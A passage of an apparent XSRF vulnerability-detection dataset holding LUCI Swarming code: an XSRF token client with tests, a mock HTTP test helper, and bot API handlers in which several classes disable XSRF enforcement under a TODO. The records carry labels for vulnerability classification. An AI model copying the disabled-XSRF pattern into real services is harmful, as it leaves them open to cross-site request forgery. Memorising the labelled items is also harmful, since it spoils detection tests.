unittest.main()\n/n/n/nappengine/swarming/swarming_bot/bot_code/xsrf_client.py/n/n# Copyright 2013 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Wraps URL requests with an XSRF token using components/auth based service.\"\"\"\n\nimport datetime\nimport logging\nimport os\nimport sys\n\nTHIS_DIR = os.path.dirname(os.path.abspath(__file__))\n\nsys.path.insert(0, os.path.join(THIS_DIR, 'third_party'))\n\nfrom utils import net\n\n\nclass Error(Exception):\n  pass\n\n\ndef _utcnow():\n  \"\"\"So it can be mocked.\"\"\"\n  return datetime.datetime.utcnow()\n\n\nclass XsrfRemote(object):\n  \"\"\"Transparently adds XSRF token to requests.\"\"\"\n  TOKEN_RESOURCE = '/auth/api/v1/accounts/self/xsrf_token'\n\n  def __init__(self, url, token_resource=None):\n    self.url = url.rstrip('/')\n    self.token = None\n    self.token_resource = token_resource or self.TOKEN_RESOURCE\n    self.expiration = None\n    self.xsrf_request_params = {}\n\n  def url_read(self, resource, **kwargs):\n    url = self.url + resource\n    if kwargs.get('data') == None:\n      # No XSRF token for GET.\n      return net.url_read(url, **kwargs)\n\n    if self.need_refresh():\n      self.refresh_token()\n    resp = self._url_read_post(url, **kwargs)\n    if resp is None:\n      raise Error('Failed to connect to %s; %s' % (url, self.expiration))\n    return resp\n\n  def url_read_json(self, resource, **kwargs):\n    url = self.url + resource\n    if kwargs.get('data') == None:\n      # No XSRF token required for GET.\n      return net.url_read_json(url, **kwargs)\n\n    if self.need_refresh():\n      self.refresh_token()\n    resp = self._url_read_json_post(url, **kwargs)\n    if resp is None:\n      raise Error('Failed to connect to %s; %s' % (url, self.expiration))\n    return resp\n\n  def refresh_token(self):\n    \"\"\"Returns a fresh token. Necessary as the token may expire after an hour.\n    \"\"\"\n    url = self.url + self.token_resource\n    resp = net.url_read_json(\n        url,\n        headers={'X-XSRF-Token-Request': '1'},\n        data=self.xsrf_request_params)\n    if resp is None:\n      raise Error('Failed to connect to %s' % url)\n    self.token = resp['xsrf_token']\n    if resp.get('expiration_sec'):\n      exp = resp['expiration_sec']\n      exp -= min(round(exp * 0.1), 600)\n      self.expiration = _utcnow() + datetime.timedelta(seconds=exp)\n    return self.token\n\n  def need_refresh(self):\n    \"\"\"Returns True if the XSRF token needs to be refreshed.\"\"\"\n    return (\n        not self.token or (self.expiration and self.expiration <= _utcnow()))\n\n  def _url_read_post(self, url, **kwargs):\n    headers = (kwargs.pop('headers', None) or {}).copy()\n    headers['X-XSRF-Token'] = self.token\n    return net.url_read(url, headers=headers, **kwargs)\n\n  def _url_read_json_post(self, url, **kwargs):\n    headers = (kwargs.pop('headers', None) or {}).copy()\n    headers['X-XSRF-Token'] = self.token\n    return net.url_read_json(url, headers=headers, **kwargs)\n/n/n/nappengine/swarming/swarming_bot/bot_code/xsrf_client_test.py/n/n#!/usr/bin/env python\n# Copyright 2013 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\nimport datetime\nimport logging\nimport os\nimport sys\nimport time\nimport unittest\n\nimport test_env_bot_code\ntest_env_bot_code.setup_test_env()\n\n# Creates a server mock for functions in net.py.\nimport net_utils\n\nimport xsrf_client\n\n\nclass UrlHelperTest(net_utils.TestCase):\n  def setUp(self):\n    super(UrlHelperTest, self).setUp()\n    self.mock(logging, 'error', lambda *_: None)\n    self.mock(logging, 'exception', lambda *_: None)\n    self.mock(logging, 'info', lambda *_: None)\n    self.mock(logging, 'warning', lambda *_: None)\n    self.mock(time, 'sleep', lambda _: None)\n\n  def testXsrfRemoteGET(self):\n    self.expected_requests([('http://localhost/a', {}, 'foo', None)])\n\n    remote = xsrf_client.XsrfRemote('http://localhost/')\n    self.assertEqual('foo', remote.url_read('/a'))\n\n  def testXsrfRemoteSimple(self):\n    self.expected_requests(\n        [\n          (\n            'http://localhost/auth/api/v1/accounts/self/xsrf_token',\n            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},\n            {\n              'expiration_sec': 100,\n              'xsrf_token': 'token',\n            },\n          ),\n          (\n            'http://localhost/a',\n            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},\n            'foo',\n            None,\n          ),\n        ])\n\n    remote = xsrf_client.XsrfRemote('http://localhost/')\n    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))\n\n  def testXsrfRemoteRefresh(self):\n    self.expected_requests(\n        [\n          (\n            'http://localhost/auth/api/v1/accounts/self/xsrf_token',\n            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},\n            {\n              'expiration_sec': 100,\n              'xsrf_token': 'token',\n            },\n          ),\n          (\n            'http://localhost/a',\n            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},\n            'bar',\n            None,\n          ),\n          (\n            'http://localhost/auth/api/v1/accounts/self/xsrf_token',\n            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},\n            {\n              'expiration_sec': 100,\n              'xsrf_token': 'token2',\n            },\n          ),\n          (\n            'http://localhost/a',\n            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token2'}},\n            'foo',\n            None,\n          ),\n        ])\n\n    now = xsrf_client._utcnow()\n    remote = xsrf_client.XsrfRemote('http://localhost/')\n    remote.url_read('/a', data={'foo': 'bar'})\n    self.mock(\n        xsrf_client, '_utcnow', lambda: now + datetime.timedelta(seconds=91))\n    remote.url_read('/a', data={'foo': 'bar'})\n\n  def testXsrfRemoteCustom(self):\n    # Use the new swarming bot API as an example of custom XSRF request handler.\n    self.expected_requests(\n        [\n          (\n            'http://localhost/swarming/api/v1/bot/handshake',\n            {\n              'data': {'attributes': 'b'},\n              'headers': {'X-XSRF-Token-Request': '1'},\n            },\n            {\n              'expiration_sec': 100,\n              'ignored': True,\n              'xsrf_token': 'token',\n            },\n          ),\n          (\n            'http://localhost/a',\n            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},\n            'foo',\n            None,\n          ),\n        ])\n\n    remote = xsrf_client.XsrfRemote(\n        'http://localhost/',\n        '/swarming/api/v1/bot/handshake')\n    remote.xsrf_request_params = {'attributes': 'b'}\n    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))\n\n\nif __name__ == '__main__':\n  logging.basicConfig(level=logging.ERROR)\n  unittest.main()\n/n/n/nclient/tests/net_utils.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\nimport logging\nimport os\nimport sys\nimport threading\n\nTEST_DIR = os.path.dirname(os.path.abspath(__file__))\nROOT_DIR = os.path.dirname(TEST_DIR)\nsys.path.insert(0, ROOT_DIR)\nsys.path.insert(0, os.path.join(ROOT_DIR, 'third_party'))\n\nfrom depot_tools import auto_stub\nfrom utils import net\n\n\ndef make_fake_response(content, url, headers=None):\n  \"\"\"Returns HttpResponse with predefined content, useful in tests.\"\"\"\n  headers = dict(headers or {})\n  headers['Content-Length'] = len(content)\n  class _Fake(object):\n    def __init__(self):\n      self.content = content\n    def iter_content(self, chunk_size):\n      c = self.content\n      while c:\n        yield c[:chunk_size]\n        c = c[chunk_size:]\n    def read(self):\n      return self.content\n  return net.HttpResponse(_Fake(), url, headers)\n\n\nclass TestCase(auto_stub.TestCase):\n  \"\"\"Mocks out url_open() calls.\"\"\"\n  def setUp(self):\n    super(TestCase, self).setUp()\n    self.mock(net, 'url_open', self._url_open)\n    self.mock(net, 'url_read_json', self._url_read_json)\n    self.mock(net, 'sleep_before_retry', lambda *_: None)\n    self._lock = threading.Lock()\n    self._requests = []\n\n  def tearDown(self):\n    try:\n      if not self.has_failed():\n        self.assertEqual([], self._requests)\n    finally:\n      super(TestCase, self).tearDown()\n\n  def expected_requests(self, requests):\n    \"\"\"Registers the expected requests along their reponses.\n\n    Arguments:\n      request: list of tuple(url, kwargs, response, headers) for normal requests\n          and tuple(url, kwargs, response) for json requests. kwargs can be a\n          callable. In that case, it's called with the actual kwargs. It's\n          useful when the kwargs values are not deterministic.\n    \"\"\"\n    requests = requests[:]\n    for request in requests:\n      self.assertEqual(tuple, request.__class__)\n      # 3 = json request (url_read_json).\n      # 4 = normal request (url_open).\n      self.assertIn(len(request), (3, 4))\n\n    with self._lock:\n      self.assertEqual([], self._requests)\n      self._requests = requests\n\n  def _url_open(self, url, **kwargs):\n    logging.warn('url_open(%s, %s)', url[:500], str(kwargs)[:500])\n    with self._lock:\n      if not self._requests:\n        return None\n      # Ignore 'stream' argument, it's not important for these tests.\n      kwargs.pop('stream', None)\n      for i, n in enumerate(self._requests):\n        if n[0] == url:\n          data = self._requests.pop(i)\n          if len(data) != 4:\n            self.fail('Expected normal request, got json data; %s' % url)\n          _, expected_kwargs, result, headers = data\n          if callable(expected_kwargs):\n            expected_kwargs(kwargs)\n          else:\n            self.assertEqual(expected_kwargs, kwargs)\n          if result is not None:\n            return make_fake_response(result, url, headers)\n          return None\n    self.fail('Unknown request %s' % url)\n\n  def _url_read_json(self, url, **kwargs):\n    logging.warn('url_read_json(%s, %s)', url[:500], str(kwargs)[:500])\n    with self._lock:\n      if not self._requests:\n        return None\n      # Ignore 'stream' argument, it's not important for these tests.\n      kwargs.pop('stream', None)\n      for i, n in enumerate(self._requests):\n        if n[0] == url:\n          data = self._requests.pop(i)\n          if len(data) != 3:\n            self.fail('Expected json request, got normal data; %s' % url)\n          _, expected_kwargs, result = data\n          if callable(expected_kwargs):\n            expected_kwargs(kwargs)\n          else:\n            self.assertEqual(expected_kwargs, kwargs)\n          if result is not None:\n            return result\n          return None\n    self.fail('Unknown request %s %s' % (url, kwargs))\n/n/n/n", "label": 0, "vtype": "xsrf"}, {"id": "c23a5bf6278f55b3f8135e0edab9927599a09236", "code": "/appengine/swarming/handlers_bot.py/n/n# Copyright 2015 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Internal bot API handlers.\"\"\"\n\nimport base64\nimport json\nimport logging\nimport textwrap\n\nimport webob\nimport webapp2\n\nfrom google.appengine.api import app_identity\nfrom google.appengine.api import datastore_errors\nfrom google.appengine.datastore import datastore_query\nfrom google.appengine import runtime\nfrom google.appengine.ext import ndb\n\nfrom components import auth\nfrom components import ereporter2\nfrom components import utils\nfrom server import acl\nfrom server import bot_code\nfrom server import bot_management\nfrom server import stats\nfrom server import task_pack\nfrom server import task_request\nfrom server import task_result\nfrom server import task_scheduler\nfrom server import task_to_run\n\n\ndef has_unexpected_subset_keys(expected_keys, minimum_keys, actual_keys, name):\n  \"\"\"Returns an error if unexpected keys are present or expected keys are\n  missing.\n\n  Accepts optional keys.\n\n  This is important to catch typos.\n  \"\"\"\n  actual_keys = frozenset(actual_keys)\n  superfluous = actual_keys - expected_keys\n  missing = minimum_keys - actual_keys\n  if superfluous or missing:\n    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''\n    msg_superfluous = (\n        (' superfluous: %s' % sorted(superfluous)) if superfluous else '')\n    return 'Unexpected %s%s%s; did you make a typo?' % (\n        name, msg_missing, msg_superfluous)\n\n\ndef has_unexpected_keys(expected_keys, actual_keys, name):\n  \"\"\"Return an error if unexpected keys are present or expected keys are\n  missing.\n  \"\"\"\n  return has_unexpected_subset_keys(\n      expected_keys, expected_keys, actual_keys, name)\n\n\ndef log_unexpected_subset_keys(\n    expected_keys, minimum_keys, actual_keys, request, source, name):\n  \"\"\"Logs an error if unexpected keys are present or expected keys are missing.\n\n  Accepts optional keys.\n\n  This is important to catch typos.\n  \"\"\"\n  message = has_unexpected_subset_keys(\n    expected_keys, minimum_keys, actual_keys, name)\n  if message:\n    ereporter2.log_request(request, source=source, message=message)\n  return message\n\n\ndef log_unexpected_keys(expected_keys, actual_keys, request, source, name):\n  \"\"\"Logs an error if unexpected keys are present or expected keys are missing.\n  \"\"\"\n  return log_unexpected_subset_keys(\n      expected_keys, expected_keys, actual_keys, request, source, name)\n\n\ndef has_missing_keys(minimum_keys, actual_keys, name):\n  \"\"\"Returns an error if expected keys are not present.\n\n  Do not warn about unexpected keys.\n  \"\"\"\n  actual_keys = frozenset(actual_keys)\n  missing = minimum_keys - actual_keys\n  if missing:\n    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''\n    return 'Unexpected %s%s; did you make a typo?' % (name, msg_missing)\n\n\nclass BootstrapHandler(auth.AuthenticatingHandler):\n  \"\"\"Returns python code to run to bootstrap a swarming bot.\"\"\"\n\n  @auth.require(acl.is_bot)\n  def get(self):\n    self.response.headers['Content-Type'] = 'text/x-python'\n    self.response.headers['Content-Disposition'] = (\n        'attachment; filename=\"swarming_bot_bootstrap.py\"')\n    self.response.out.write(\n        bot_code.get_bootstrap(self.request.host_url).content)\n\n\nclass BotCodeHandler(auth.AuthenticatingHandler):\n  \"\"\"Returns a zip file with all the files required by a bot.\n\n  Optionally specify the hash version to download. If so, the returned data is\n  cacheable.\n  \"\"\"\n\n  @auth.require(acl.is_bot)\n  def get(self, version=None):\n    if version:\n      expected = bot_code.get_bot_version(self.request.host_url)\n      if version != expected:\n        # This can happen when the server is rapidly updated.\n        logging.error('Requested Swarming bot %s, have %s', version, expected)\n        self.abort(404)\n      self.response.headers['Cache-Control'] = 'public, max-age=3600'\n    else:\n      self.response.headers['Cache-Control'] = 'no-cache, no-store'\n    self.response.headers['Content-Type'] = 'application/octet-stream'\n    self.response.headers['Content-Disposition'] = (\n        'attachment; filename=\"swarming_bot.zip\"')\n    self.response.out.write(\n        bot_code.get_swarming_bot_zip(self.request.host_url))\n\n\nclass _BotBaseHandler(auth.ApiHandler):\n  \"\"\"\n  Request body is a JSON dict:\n    {\n      \"dimensions\": <dict of properties>,\n      \"state\": <dict of properties>,\n      \"version\": <sha-1 of swarming_bot.zip uncompressed content>,\n    }\n  \"\"\"\n\n  EXPECTED_KEYS = {u'dimensions', u'state', u'version'}\n  REQUIRED_STATE_KEYS = {u'running_time', u'sleep_streak'}\n\n  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.\n  xsrf_token_enforce_on = ()\n\n  def _process(self):\n    \"\"\"Returns True if the bot has invalid parameter and should be automatically\n    quarantined.\n\n    Does one DB synchronous GET.\n\n    Returns:\n      tuple(request, bot_id, version, state, dimensions, quarantined_msg)\n    \"\"\"\n    request = self.parse_body()\n    version = request.get('version', None)\n\n    dimensions = request.get('dimensions', {})\n    state = request.get('state', {})\n    bot_id = None\n    if dimensions.get('id'):\n      dimension_id = dimensions['id']\n      if (isinstance(dimension_id, list) and len(dimension_id) == 1\n          and isinstance(dimension_id[0], unicode)):\n        bot_id = dimensions['id'][0]\n\n    # The bot may decide to \"self-quarantine\" itself. Accept both via\n    # dimensions or via state. See bot_management._BotCommon.quarantined for\n    # more details.\n    if (bool(dimensions.get('quarantined')) or\n        bool(state.get('quarantined'))):\n      return request, bot_id, version, state, dimensions, 'Bot self-quarantined'\n\n    quarantined_msg = None\n    # Use a dummy 'for' to be able to break early from the block.\n    for _ in [0]:\n\n      quarantined_msg = has_unexpected_keys(\n          self.EXPECTED_KEYS, request, 'keys')\n      if quarantined_msg:\n        break\n\n      quarantined_msg = has_missing_keys(\n          self.REQUIRED_STATE_KEYS, state, 'state')\n      if quarantined_msg:\n        break\n\n      if not bot_id:\n        quarantined_msg = 'Missing bot id'\n        break\n\n      if not all(\n          isinstance(key, unicode) and\n          isinstance(values, list) and\n          all(isinstance(value, unicode) for value in values)\n          for key, values in dimensions.iteritems()):\n        quarantined_msg = (\n            'Invalid dimensions type:\\n%s' % json.dumps(dimensions,\n              sort_keys=True, indent=2, separators=(',', ': ')))\n        break\n\n      dimensions_count = task_to_run.dimensions_powerset_count(dimensions)\n      if dimensions_count > task_to_run.MAX_DIMENSIONS:\n        quarantined_msg = 'Dimensions product %d is too high' % dimensions_count\n        break\n\n      if not isinstance(\n          state.get('lease_expiration_ts'), (None.__class__, int)):\n        quarantined_msg = (\n            'lease_expiration_ts (%r) must be int or None' % (\n                state['lease_expiration_ts']))\n        break\n\n    if quarantined_msg:\n      line = 'Quarantined Bot\\nhttps://%s/restricted/bot/%s\\n%s' % (\n          app_identity.get_default_version_hostname(), bot_id,\n          quarantined_msg)\n      ereporter2.log_request(self.request, source='bot', message=line)\n      return request, bot_id, version, state, dimensions, quarantined_msg\n\n    # Look for admin enforced quarantine.\n    bot_settings = bot_management.get_settings_key(bot_id).get()\n    if bool(bot_settings and bot_settings.quarantined):\n      return request, bot_id, version, state, dimensions, 'Quarantined by admin'\n\n    return request, bot_id, version, state, dimensions, None\n\n\nclass BotHandshakeHandler(_BotBaseHandler):\n  \"\"\"First request to be called to get initial data like XSRF token.\n\n  The bot is server-controled so the server doesn't have to support multiple API\n  version. When running a task, the bot sync the the version specific URL. Once\n  abot finished its currently running task, it'll be immediately be upgraded\n  after on its next poll.\n\n  This endpoint does not return commands to the bot, for example to upgrade\n  itself. It'll be told so when it does its first poll.\n\n  Response body is a JSON dict:\n    {\n      \"bot_version\": <sha-1 of swarming_bot.zip uncompressed content>,\n      \"server_version\": \"138-193f1f3\",\n      \"xsrf_token\": \"......\",\n    }\n  \"\"\"\n\n  # This handler is called to get XSRF token, there's nothing to enforce yet.\n  xsrf_token_enforce_on = ()\n\n  @auth.require_xsrf_token_request\n  @auth.require(acl.is_bot)\n  def post(self):\n    (_request, bot_id, version, state,\n        dimensions, quarantined_msg) = self._process()\n    bot_management.bot_event(\n        event_type='bot_connected', bot_id=bot_id,\n        external_ip=self.request.remote_addr, dimensions=dimensions,\n        state=state, version=version, quarantined=bool(quarantined_msg),\n        task_id='', task_name=None, message=quarantined_msg)\n\n    data = {\n      # This access token will be used to validate each subsequent request.\n      'bot_version': bot_code.get_bot_version(self.request.host_url),\n      'expiration_sec': auth.handler.XSRFToken.expiration_sec,\n      'server_version': utils.get_app_version(),\n      'xsrf_token': self.generate_xsrf_token(),\n    }\n    self.send_response(data)\n\n\nclass BotPollHandler(_BotBaseHandler):\n  \"\"\"The bot polls for a task; returns either a task, update command or sleep.\n\n  In case of exception on the bot, this is enough to get it just far enough to\n  eventually self-update to a working version. This is to ensure that coding\n  errors in bot code doesn't kill all the fleet at once, they should still be up\n  just enough to be able to self-update again even if they don't get task\n  assigned anymore.\n  \"\"\"\n\n  @auth.require(acl.is_bot)\n  def post(self):\n    \"\"\"Handles a polling request.\n\n    Be very permissive on missing values. This can happen because of errors\n    on the bot, *we don't want to deny them the capacity to update*, so that the\n    bot code is eventually fixed and the bot self-update to this working code.\n\n    It makes recovery of the fleet in case of catastrophic failure much easier.\n    \"\"\"\n    (_request, bot_id, version, state,\n        dimensions, quarantined_msg) = self._process()\n    sleep_streak = state.get('sleep_streak', 0)\n    quarantined = bool(quarantined_msg)\n\n    # Note bot existence at two places, one for stats at 1 minute resolution,\n    # the other for the list of known bots.\n    action = 'bot_inactive' if quarantined else 'bot_active'\n    stats.add_entry(action=action, bot_id=bot_id, dimensions=dimensions)\n\n    def bot_event(event_type, task_id=None, task_name=None):\n      bot_management.bot_event(\n          event_type=event_type, bot_id=bot_id,\n          external_ip=self.request.remote_addr, dimensions=dimensions,\n          state=state, version=version, quarantined=quarantined,\n          task_id=task_id, task_name=task_name, message=quarantined_msg)\n\n    # Bot version is host-specific because the host URL is embedded in\n    # swarming_bot.zip\n    expected_version = bot_code.get_bot_version(self.request.host_url)\n    if version != expected_version:\n      bot_event('request_update')\n      self._cmd_update(expected_version)\n      return\n    if quarantined:\n      bot_event('request_sleep')\n      self._cmd_sleep(sleep_streak, quarantined)\n      return\n\n    #\n    # At that point, the bot should be in relatively good shape since it's\n    # running the right version. It is still possible that invalid code was\n    # pushed to the server, so be diligent about it.\n    #\n\n    # Bot may need a reboot if it is running for too long. We do not reboot\n    # quarantined bots.\n    needs_restart, restart_message = bot_management.should_restart_bot(\n        bot_id, state)\n    if needs_restart:\n      bot_event('request_restart')\n      self._cmd_restart(restart_message)\n      return\n\n    # The bot is in good shape. Try to grab a task.\n    try:\n      # This is a fairly complex function call, exceptions are expected.\n      request, run_result = task_scheduler.bot_reap_task(\n          dimensions, bot_id, version, state.get('lease_expiration_ts'))\n      if not request:\n        # No task found, tell it to sleep a bit.\n        bot_event('request_sleep')\n        self._cmd_sleep(sleep_streak, quarantined)\n        return\n\n      try:\n        # This part is tricky since it intentionally runs a transaction after\n        # another one.\n        if request.properties.is_terminate:\n          bot_event('bot_terminate', task_id=run_result.task_id)\n          self._cmd_terminate(run_result.task_id)\n        else:\n          bot_event(\n              'request_task', task_id=run_result.task_id,\n              task_name=request.name)\n          self._cmd_run(request, run_result.key, bot_id)\n      except:\n        logging.exception('Dang, exception after reaping')\n        raise\n    except runtime.DeadlineExceededError:\n      # If the timeout happened before a task was assigned there is no problems.\n      # If the timeout occurred after a task was assigned, that task will\n      # timeout (BOT_DIED) since the bot didn't get the details required to\n      # run it) and it will automatically get retried (TODO) when the task times\n      # out.\n      # TODO(maruel): Note the task if possible and hand it out on next poll.\n      # https://code.google.com/p/swarming/issues/detail?id=130\n      self.abort(500, 'Deadline')\n\n  def _cmd_run(self, request, run_result_key, bot_id):\n    cmd = None\n    if request.properties.commands:\n      cmd = request.properties.commands[0]\n    elif request.properties.command:\n      cmd = request.properties.command\n    out = {\n      'cmd': 'run',\n      'manifest': {\n        'bot_id': bot_id,\n        'command': cmd,\n        'dimensions': request.properties.dimensions,\n        'env': request.properties.env,\n        'extra_args': request.properties.extra_args,\n        'grace_period': request.properties.grace_period_secs,\n        'hard_timeout': request.properties.execution_timeout_secs,\n        'host': utils.get_versioned_hosturl(),\n        'io_timeout': request.properties.io_timeout_secs,\n        'inputs_ref': request.properties.inputs_ref,\n        'task_id': task_pack.pack_run_result_key(run_result_key),\n      },\n    }\n    self.send_response(utils.to_json_encodable(out))\n\n  def _cmd_sleep(self, sleep_streak, quarantined):\n    out = {\n      'cmd': 'sleep',\n      'duration': task_scheduler.exponential_backoff(sleep_streak),\n      'quarantined': quarantined,\n    }\n    self.send_response(out)\n\n  def _cmd_terminate(self, task_id):\n    out = {\n      'cmd': 'terminate',\n      'task_id': task_id,\n    }\n    self.send_response(out)\n\n  def _cmd_update(self, expected_version):\n    out = {\n      'cmd': 'update',\n      'version': expected_version,\n    }\n    self.send_response(out)\n\n  def _cmd_restart(self, message):\n    logging.info('Rebooting bot: %s', message)\n    out = {\n      'cmd': 'restart',\n      'message': message,\n    }\n    self.send_response(out)\n\n\nclass BotEventHandler(_BotBaseHandler):\n  \"\"\"On signal that a bot had an event worth logging.\"\"\"\n\n  EXPECTED_KEYS = _BotBaseHandler.EXPECTED_KEYS | {u'event', u'message'}\n\n  @auth.require(acl.is_bot)\n  def post(self):\n    (request, bot_id, version, state,\n        dimensions, quarantined_msg) = self._process()\n    event = request.get('event')\n    if event not in ('bot_error', 'bot_rebooting', 'bot_shutdown'):\n      self.abort_with_error(400, error='Unsupported event type')\n    message = request.get('message')\n    bot_management.bot_event(\n        event_type=event, bot_id=bot_id, external_ip=self.request.remote_addr,\n        dimensions=dimensions, state=state, version=version,\n        quarantined=bool(quarantined_msg), task_id=None, task_name=None,\n        message=message)\n\n    if event == 'bot_error':\n      line = (\n          'Bot: https://%s/restricted/bot/%s\\n'\n          'Bot error:\\n'\n          '%s') % (\n          app_identity.get_default_version_hostname(), bot_id, message)\n      ereporter2.log_request(self.request, source='bot', message=line)\n    self.send_response({})\n\n\nclass BotTaskUpdateHandler(auth.ApiHandler):\n  \"\"\"Receives updates from a Bot for a task.\n\n  The handler verifies packets are processed in order and will refuse\n  out-of-order packets.\n  \"\"\"\n  ACCEPTED_KEYS = {\n    u'bot_overhead', u'cost_usd', u'duration', u'exit_code',\n    u'hard_timeout', u'id', u'io_timeout', u'isolated_stats', u'output',\n    u'output_chunk_start', u'outputs_ref', u'task_id',\n  }\n  REQUIRED_KEYS = {u'id', u'task_id'}\n\n  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.\n  xsrf_token_enforce_on = ()\n\n  @auth.require(acl.is_bot)\n  def post(self, task_id=None):\n    # Unlike handshake and poll, we do not accept invalid keys here. This code\n    # path is much more strict.\n    request = self.parse_body()\n    msg = log_unexpected_subset_keys(\n        self.ACCEPTED_KEYS, self.REQUIRED_KEYS, request, self.request, 'bot',\n        'keys')\n    if msg:\n      self.abort_with_error(400, error=msg)\n\n    bot_id = request['id']\n    cost_usd = request['cost_usd']\n    task_id = request['task_id']\n\n    bot_overhead = request.get('bot_overhead')\n    duration = request.get('duration')\n    exit_code = request.get('exit_code')\n    hard_timeout = request.get('hard_timeout')\n    io_timeout = request.get('io_timeout')\n    isolated_stats = request.get('isolated_stats')\n    output = request.get('output')\n    output_chunk_start = request.get('output_chunk_start')\n    outputs_ref = request.get('outputs_ref')\n\n    if bool(isolated_stats) != (bot_overhead is not None):\n      ereporter2.log_request(\n          request=self.request,\n          source='server',\n          category='task_failure',\n          message='Failed to update task: %s' % task_id)\n      self.abort_with_error(\n          400,\n          error='Both bot_overhead and isolated_stats must be set '\n                'simultaneously\\nbot_overhead: %s\\nisolated_stats: %s' %\n                (bot_overhead, isolated_stats))\n\n    run_result_key = task_pack.unpack_run_result_key(task_id)\n    performance_stats = None\n    if isolated_stats:\n      download = isolated_stats['download']\n      upload = isolated_stats['upload']\n      performance_stats = task_result.PerformanceStats(\n          bot_overhead=bot_overhead,\n          isolated_download=task_result.IsolatedOperation(\n              duration=download['duration'],\n              initial_number_items=download['initial_number_items'],\n              initial_size=download['initial_size'],\n              items_cold=base64.b64decode(download['items_cold']),\n              items_hot=base64.b64decode(download['items_hot'])),\n          isolated_upload=task_result.IsolatedOperation(\n              duration=upload['duration'],\n              items_cold=base64.b64decode(upload['items_cold']),\n              items_hot=base64.b64decode(upload['items_hot'])))\n\n    if output is not None:\n      try:\n        output = base64.b64decode(output)\n      except UnicodeEncodeError as e:\n        logging.error('Failed to decode output\\n%s\\n%r', e, output)\n        output = output.encode('ascii', 'replace')\n      except TypeError as e:\n        # Save the output as-is instead. The error will be logged in ereporter2\n        # and returning a HTTP 500 would only force the bot to stay in a retry\n        # loop.\n        logging.error('Failed to decode output\\n%s\\n%r', e, output)\n    if outputs_ref:\n      outputs_ref = task_request.FilesRef(**outputs_ref)\n\n    try:\n      state = task_scheduler.bot_update_task(\n          run_result_key=run_result_key,\n          bot_id=bot_id,\n          output=output,\n          output_chunk_start=output_chunk_start,\n          exit_code=exit_code,\n          duration=duration,\n          hard_timeout=hard_timeout,\n          io_timeout=io_timeout,\n          cost_usd=cost_usd,\n          outputs_ref=outputs_ref,\n          performance_stats=performance_stats)\n      if not state:\n        logging.info('Failed to update, please retry')\n        self.abort_with_error(500, error='Failed to update, please retry')\n\n      if state in (task_result.State.COMPLETED, task_result.State.TIMED_OUT):\n        action = 'task_completed'\n      else:\n        assert state == task_result.State.RUNNING, state\n        action = 'task_update'\n      bot_management.bot_event(\n          event_type=action, bot_id=bot_id,\n          external_ip=self.request.remote_addr, dimensions=None, state=None,\n          version=None, quarantined=None, task_id=task_id, task_name=None)\n    except ValueError as e:\n      ereporter2.log_request(\n          request=self.request,\n          source='server',\n          category='task_failure',\n          message='Failed to update task: %s' % e)\n      self.abort_with_error(400, error=str(e))\n    except webob.exc.HTTPException:\n      raise\n    except Exception as e:\n      logging.exception('Internal error: %s', e)\n      self.abort_with_error(500, error=str(e))\n\n    # TODO(maruel): When a task is canceled, reply with 'DIE' so that the bot\n    # reboots itself to abort the task abruptly. It is useful when a task hangs\n    # and the timeout was set too long or the task was superseded by a newer\n    # task with more recent executable (e.g. a new Try Server job on a newer\n    # patchset on Rietveld).\n    self.send_response({'ok': True})\n\n\nclass BotTaskErrorHandler(auth.ApiHandler):\n  \"\"\"It is a specialized version of ereporter2's /ereporter2/api/v1/on_error\n  that also attaches a task id to it.\n\n  This formally kills the task, marking it as an internal failure. This can be\n  used by bot_main.py to kill the task when task_runner misbehaved.\n  \"\"\"\n\n  EXPECTED_KEYS = {u'id', u'message', u'task_id'}\n\n  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.\n  xsrf_token_enforce_on = ()\n\n  @auth.require(acl.is_bot)\n  def post(self, task_id=None):\n    request = self.parse_body()\n    bot_id = request.get('id')\n    task_id = request.get('task_id', '')\n    message = request.get('message', 'unknown')\n\n    bot_management.bot_event(\n        event_type='task_error', bot_id=bot_id,\n        external_ip=self.request.remote_addr, dimensions=None, state=None,\n        version=None, quarantined=None, task_id=task_id, task_name=None,\n        message=message)\n    line = (\n        'Bot: https://%s/restricted/bot/%s\\n'\n        'Task failed: https://%s/user/task/%s\\n'\n        '%s') % (\n        app_identity.get_default_version_hostname(), bot_id,\n        app_identity.get_default_version_hostname(), task_id,\n        message)\n    ereporter2.log_request(self.request, source='bot', message=line)\n\n    msg = log_unexpected_keys(\n        self.EXPECTED_KEYS, request, self.request, 'bot', 'keys')\n    if msg:\n      self.abort_with_error(400, error=msg)\n\n    msg = task_scheduler.bot_kill_task(\n        task_pack.unpack_run_result_key(task_id), bot_id)\n    if msg:\n      logging.error(msg)\n      self.abort_with_error(400, error=msg)\n    self.send_response({})\n\n\nclass ServerPingHandler(webapp2.RequestHandler):\n  \"\"\"Handler to ping when checking if the server is up.\n\n  This handler should be extremely lightweight. It shouldn't do any\n  computations, it should just state that the server is up. It's open to\n  everyone for simplicity and performance.\n  \"\"\"\n\n  def get(self):\n    self.response.headers['Content-Type'] = 'text/plain; charset=utf-8'\n    self.response.out.write('Server up')\n\n\ndef get_routes():\n  routes = [\n      ('/bootstrap', BootstrapHandler),\n      ('/bot_code', BotCodeHandler),\n      